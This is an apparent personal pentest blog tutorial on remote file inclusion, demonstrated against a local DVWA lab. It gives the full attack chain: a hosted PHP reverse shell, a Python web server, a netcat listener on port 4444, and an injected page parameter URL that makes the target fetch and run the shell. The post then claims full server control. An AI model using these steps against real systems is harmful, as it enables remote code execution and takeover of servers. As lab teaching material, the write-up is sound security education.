---
title: Remote file inclusion
date: 14,sep 2022 01:22 AM
categories : [Penetration Tester, Web Hacking ,file inclusion]
tags: [web hacking , file inclusion ]
---
# Remote file inclusion (RFI)
![global pic](/assets/rfi.jpg)
## What is RFI
Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts , so the hacker can host his web server in the client of the victim that's to give him the power to do a lot of things :
- Code execution on the web server
- Executing client-side code like JavaScript that can lead to other attacks like Cross-site scripting (XSS).
- Denial of Service (DoS)
- Data Theft / Manipulation


![global pic](/assets/rfi2.jpg)
---

## how hacker discover this vulnerabilities

[See this post](https://chalalsaad.github.io/posts/file-inclusion-first-post/)

---

## Remote file inclusion examples
i will attack my [DVWA](https://www.kali.org/tools/dvwa/) lab 




![global pic](/assets/rfi3.png)



First we need [reverse PHP shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) This  script will open an outbound TCP connection from the web server to a host and port of your choice.  Bound to this TCP connection will be a shell.if you are php developer you can build your own , is available in [GitHub](https://github.com/pentestmonkey/php-reverse-shell):

Open the php-reverse-shell.php file by nano or any editor and try to verify double thing of course the ip and the port

![ reverse shell](/assets/rfi4.png)

---
Now we need to create a web server ,me i use [python web  server](https://pythonbasics.org/webserver/) ,you can use other  one doesn't matter.

To start a webserver run the command below:
```shell
python3 -m http.server 8888
```
![global pic](/assets/rfi7.png)

![ reverse shell](/assets/rfi5.png)


Now i will use [netcat](https://fr.wikipedia.org/wiki/Netcat) to listening in the target by his port , so netcat functions as a back-end tool that allows for port scanning and port listening.

To start listening on 4444:
```shell
  sudo nc -lvnp 4444
```
- -l :  listen mode, for inbound connects
- -v           verbose [use twice to be more verbose]
- -n           numeric-only IP addresses, no DNS
- -p port      local port number (port numbers can be individual or ranges: lo-hi [inclusive])

![ reverse shell](/assets/rfi6.png)

Ultimate step is run this shell in the victim client 
```http
 http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://0.0.0.0:8888/php-reverse-shell.php
```
![ reverse shell](/assets/rfi8.png)

---
![ reverse shell](/assets/rfi9.png)

### our shell is get in the web server of the victim with successfully


![ reverse shell](/assets/rfi10.png)

### now we have the full control on the server, we can run any command we want and access to any hidden file


![ reverse shell](/assets/rfi11.png)






